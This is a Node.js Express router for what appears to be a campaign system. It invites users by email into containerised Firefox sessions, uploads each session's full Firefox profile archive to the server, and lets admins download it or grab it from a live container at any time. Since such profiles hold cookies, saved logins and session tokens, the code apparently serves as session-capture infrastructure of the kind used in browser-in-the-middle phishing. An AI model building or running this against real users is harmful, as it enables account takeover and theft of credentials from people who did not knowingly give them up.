'use strict';
const express = require('express');
const fs   = require('fs');
const path = require('path');
const { getDb } = require('../models/init-db');
const { verifyBearerToken, signSessionToken } = require('../services/jwt');
const { teardownContainer, grabContainerProfile } = require('../services/docker');
const { sessionLimiter } = require('../middleware/rateLimiter');
const { requireAdminSession } = require('../middleware/auth');

const PROFILE_DIR = path.join(process.env.DATA_DIR || '/data', 'profiles');

const router = express.Router();
router.use(sessionLimiter);

// ── Helpers ───────────────────────────────────────────────────────────────────

function getActiveSession(db, sessionId) {
  return db.prepare(`
    SELECT s.*, c.redirect_url, c.lifetime_minutes, c.after_completion
    FROM sessions s
    JOIN invite_tokens it ON it.id = s.invite_token_id
    JOIN campaigns c ON c.id = it.campaign_id
    WHERE s.session_id = ? AND s.jwt_invalidated = 0
  `).get(sessionId);
}

// ── POST /session/:session_id/submit ──────────────────────────────────────────
//
// Called by the container to submit structured session data.
// Auth: Bearer <SESSION_TOKEN> JWT
// Body: { session_id, event_type, payload, timestamp }
//
// Validation chain:
//   1. JWT signature + expiry
//   2. session_id in JWT matches URL param (prevents token reuse across sessions)
//   3. Session exists and is still active
//   4. Not already submitted (idempotency guard → 409)
//   5. Body schema
router.post('/:session_id/submit', (req, res) => {
  let payload;
  try {
    payload = verifyBearerToken(req.headers.authorization);
  } catch (e) {
    return res.status(401).json({ error: e.message });
  }

  const { session_id } = req.params;

  // Enforce that the token was issued for this specific session.
  // A compromised token cannot be used to submit on behalf of another session.
  if (payload.session_id !== session_id) {
    return res.status(403).json({ error: 'Token does not match session' });
  }

  const { event_type, payload: bodyPayload, timestamp } = req.body;
  if (!event_type || !bodyPayload || !timestamp) {
    return res.status(400).json({ error: 'Missing required fields: event_type, payload, timestamp' });
  }

  const db = getDb();
  try {
    const session = getActiveSession(db, session_id);
    if (!session) return res.status(404).json({ error: 'Session not found or already invalidated' });
    if (session.submitted) return res.status(409).json({ error: 'Session already submitted' });

    const payloadStr = typeof bodyPayload === 'string' ? bodyPayload : JSON.stringify(bodyPayload);

    db.prepare(`
      INSERT INTO session_submissions (session_id, event_type, payload, timestamp)
      VALUES (?, ?, ?, ?)
    `).run(session_id, event_type, payloadStr, timestamp);

    // Mark submitted but do NOT invalidate the JWT yet — the container may still
    // need to hit /complete to clean itself up.
    db.prepare('UPDATE sessions SET submitted = 1 WHERE session_id = ?').run(session_id);

    return res.json({ ok: true });
  } finally {
    db.close();
  }
});

// ── GET|POST /session/:session_id/complete ────────────────────────────────────
//
// Hit by the container (or user's browser) to signal session completion.
// On success: tears down the container and redirects to campaign redirect_url.
//
// GET is supported so Firefox can navigate there directly.
// POST is preferred from automated container scripts.
async function handleComplete(req, res) {
  let payload;
  try {
    payload = verifyBearerToken(req.headers.authorization || `Bearer ${req.query.token || ''}`);
  } catch (e) {
    return res.status(401).json({ error: e.message });
  }

  const { session_id } = req.params;
  if (payload.session_id !== session_id) {
    return res.status(403).json({ error: 'Token does not match session' });
  }

  const db = getDb();
  try {
    const session = getActiveSession(db, session_id);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or already completed' });
    }

    if (session.after_completion === 'keep_alive') {
      // Profile was already exported by monitor.sh. Keep the container running
      // until the lifetime expires — the viewer page will redirect on expiry.
      db.prepare(`
        UPDATE sessions SET completion_reason = 'trigger' WHERE session_id = ?
      `).run(session_id);
      db.close();
      return res.json({ ok: true });
    }

    // Default: redirect mode — stop the container, mark session complete.
    // The viewer page polls /vnc/:id/status and redirects client-side.
    db.prepare(`
      UPDATE sessions
      SET completed_at = datetime('now'), completion_reason = 'trigger',
          jwt_invalidated = 1
      WHERE session_id = ?
    `).run(session_id);

    db.prepare('UPDATE invite_tokens SET completed = 1 WHERE id = ?')
      .run(session.invite_token_id);

    db.close();

    if (session.container_id) {
      teardownContainer(session.container_id).catch(err =>
        console.error(`Failed to teardown container ${session.container_id}:`, err)
      );
    }

    return res.json({ ok: true });
  } catch (e) {
    db.close();
    throw e;
  }
}

router.get('/:session_id/complete', handleComplete);
router.post('/:session_id/complete', handleComplete);

// ── POST /session/:session_id/profile ─────────────────────────────────────────
//
// Called by the container's monitor script to upload the Firefox profile archive.
// Auth: Bearer <SESSION_TOKEN>
// Body: raw binary (application/octet-stream), streamed directly to disk.
// The profile is stored at /data/profiles/<session_id>.tar.gz.
router.post('/:session_id/profile', (req, res) => {
  const { session_id } = req.params;
  console.log(`[profile-upload] POST /session/${session_id}/profile — auth: ${req.headers.authorization ? 'present' : 'MISSING'}`);

  let jwtPayload;
  try {
    jwtPayload = verifyBearerToken(req.headers.authorization);
  } catch (e) {
    console.error(`[profile-upload] JWT error for ${session_id}:`, e.message);
    return res.status(401).json({ error: e.message });
  }

  if (jwtPayload.session_id !== session_id) {
    console.error(`[profile-upload] session_id mismatch: token=${jwtPayload.session_id} url=${session_id}`);
    return res.status(403).json({ error: 'Token does not match session' });
  }

  const db = getDb();
  const session = getActiveSession(db, session_id);
  db.close();
  if (!session) {
    console.error(`[profile-upload] session not found or jwt_invalidated: ${session_id}`);
    return res.status(404).json({ error: 'Session not found or already completed' });
  }

  fs.mkdirSync(PROFILE_DIR, { recursive: true });
  const profilePath = path.join(PROFILE_DIR, `${session_id}.tar.gz`);
  const writeStream = fs.createWriteStream(profilePath);

  req.pipe(writeStream);

  writeStream.on('finish', () => {
    const db2 = getDb();
    db2.prepare('UPDATE sessions SET profile_path = ? WHERE session_id = ?').run(profilePath, session_id);
    db2.close();
    console.log(`[profile] Saved profile for session ${session_id} (${fs.statSync(profilePath).size} bytes)`);
    res.json({ ok: true });
  });

  writeStream.on('error', (err) => {
    console.error('[profile] Write error:', err.message);
    res.status(500).json({ error: 'Failed to save profile' });
  });
});

// ── GET /session/:session_id/profile — admin profile download ─────────────────
router.get('/:session_id/profile', requireAdminSession, (req, res) => {
  const db  = getDb();
  const row = db.prepare('SELECT profile_path FROM sessions WHERE session_id = ?').get(req.params.session_id);
  db.close();

  if (!row || !row.profile_path) {
    return res.status(404).send('Profile not available for this session.');
  }
  if (!fs.existsSync(row.profile_path)) {
    return res.status(404).send('Profile file missing from disk.');
  }

  res.download(row.profile_path, `firefox-profile-${req.params.session_id}.tar.gz`);
});

// ── POST /session/:session_id/grab — admin manual profile grab ────────────────
//
// Runs grab-profile.sh inside the live container via docker exec.
// Issues a fresh short-lived JWT so the script can authenticate the upload.
router.post('/:session_id/grab', requireAdminSession, async (req, res, next) => {
  const db  = getDb();
  const session = db.prepare(
    'SELECT session_id, container_id FROM sessions WHERE session_id = ? AND completed_at IS NULL'
  ).get(req.params.session_id);
  db.close();

  if (!session) return res.status(404).json({ error: 'Active session not found' });

  // Issue a fresh 5-minute token scoped to this session for the upload call.
  const freshToken = signSessionToken({
    sessionId:       session.session_id,
    containerId:     session.container_id || 'grab',
    lifetimeMinutes: 5,
  });

  const controlHost = process.env.CONTAINER_HOST || process.env.CONTROL_HOST || `http://localhost:${process.env.PORT || 3000}`;
  const uploadUrl   = `${controlHost}/session/${session.session_id}/profile`;

  try {
    await grabContainerProfile(session.session_id, freshToken, uploadUrl);
  } catch (err) {
    return next(Object.assign(err, { status: 502 }));
  }

  // Give DB a moment to commit the profile_path written by the upload handler.
  await new Promise(r => setTimeout(r, 500));

  const db2 = getDb();
  const updated = db2.prepare('SELECT profile_path FROM sessions WHERE session_id = ?').get(session.session_id);
  db2.close();

  res.json({ ok: true, profileAvailable: !!(updated && updated.profile_path) });
});

// ── GET /admin/sessions — session log (admin only) ───────────────────────────
router.get('/', requireAdminSession, (req, res) => {
  const db = getDb();
  const sessions = db.prepare(`
    SELECT s.*, it.email, it.token, c.name as campaign_name, c.completion_url,
           ss.event_type, ss.payload, ss.received_at as submitted_at
    FROM sessions s
    JOIN invite_tokens it ON it.id = s.invite_token_id
    JOIN campaigns c ON c.id = it.campaign_id
    LEFT JOIN session_submissions ss ON ss.session_id = s.session_id
    ORDER BY s.launched_at DESC
  `).all();
  db.close();
  res.render('admin/sessions/list', { title: 'Session Log', sessions });
});

module.exports = router;
